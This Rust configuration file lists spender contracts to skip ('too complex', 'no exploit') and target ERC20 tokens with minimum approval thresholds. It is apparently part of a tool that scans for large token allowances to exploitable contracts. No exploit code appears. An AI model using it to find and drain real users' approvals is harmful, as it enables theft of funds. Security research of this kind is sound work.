use alloy::primitives::{address, Address, U256};
use std::collections::HashMap;
use std::str::FromStr;

pub struct TokenConfig {
    pub ticker: &'static str,
    pub decimals: u8,
    pub min_approval: U256,
}

/// Returns the list of addresses to ignore (known safe contracts or too complex)
pub fn get_ignored_spenders() -> [Address; 12] {
    [
        address!("7a250d5630B4cF539739dF2C5dAcb4c659F2488D"), // Uniswap V2 Router
        address!("0000000000001fF3684f28c67538d4D072C22734"), // Allowance holder
        address!("000000000022D473030F116dDEE9F6B43aC78BA3"), // Uniswap Permit2
        address!("111111125421cA6dc452d289314280a0f8842A65"), // 1inch
        address!("888888888889758F76e7103c6CbF23ABbF58F946"), // too complex
        address!("69460570c93f9DE5E2edbC3052bf10125f0Ca22d"), // too complex
        address!("72fAEbF58A62e33C044c37D8D973a961633ea294"), // too complex
        address!("6131B5fae19EA4f9D964eAc0408E4408b66337b5"), // too complex
        address!("b300000b72DEAEb607a12d5f54773D1C19c7028d"), // too complex
        address!("07964f135f276412b3182a3b2407b8dd45000000"), // too complex
        address!("3B4D794a66304F130a4Db8F2551B0070dfCf5ca7"), // too complex
        address!("B685760EBD368a891F27ae547391F4E2A289895b"), // no exploit
    ]
}

/// Returns the map of target ERC20 tokens and their minimum approval thresholds
pub fn get_target_tokens() -> HashMap<Address, TokenConfig> {
    let mut targets = HashMap::new();

    targets.insert(
        address!("C02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"),
        TokenConfig { ticker: "WETH",  decimals: 18, min_approval: U256::from(1_000_000_000_000_000_000_u64) },
    );
    targets.insert(
        address!("A0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"),
        TokenConfig { ticker: "USDC",  decimals: 6,  min_approval: U256::from(2_000_000_000_u64) },
    );
    targets.insert(
        address!("dAC17F958D2ee523a2206206994597C13D831ec7"),
        TokenConfig { ticker: "USDT",  decimals: 6,  min_approval: U256::from(2_000_000_000_u64) },
    );
    targets.insert(
        address!("6B175474E89094C44Da98b954EedeAC495271d0F"),
        TokenConfig { ticker: "DAI",   decimals: 18, min_approval: U256::from_str("2000000000000000000000").unwrap() },
    );
    targets.insert(
        address!("ae7ab96520de3a18e5e111b5eaab095312d7fe84"),
        TokenConfig { ticker: "stETH", decimals: 18, min_approval: U256::from(1_000_000_000_000_000_000_u64) },
    );
    targets.insert(
        address!("B8c77482e45F1F44dE1745F52C74426C631bDD52"),
        TokenConfig { ticker: "BNB",   decimals: 18, min_approval: U256::from(3_000_000_000_000_000_000_u64) },
    );
    targets.insert(
        address!("d1d82d3ab815e0b47e38ec2d666c5b8aa05ae501"),
        TokenConfig { ticker: "SOL",   decimals: 9,  min_approval: U256::from(20_000_000_000_u64) },
    );
    targets.insert(
        address!("514910771af9ca656af840dff83e8264ecf986ca"),
        TokenConfig { ticker: "LINK",  decimals: 18, min_approval: U256::from_str("200000000000000000000").unwrap() },
    );
    targets.insert(
        address!("2260fac5e5542a773aa44fbcfedf7c193bc2c599"),
        TokenConfig { ticker: "WBTC",  decimals: 8,  min_approval: U256::from(3_000_000_u64) },
    );

    targets
}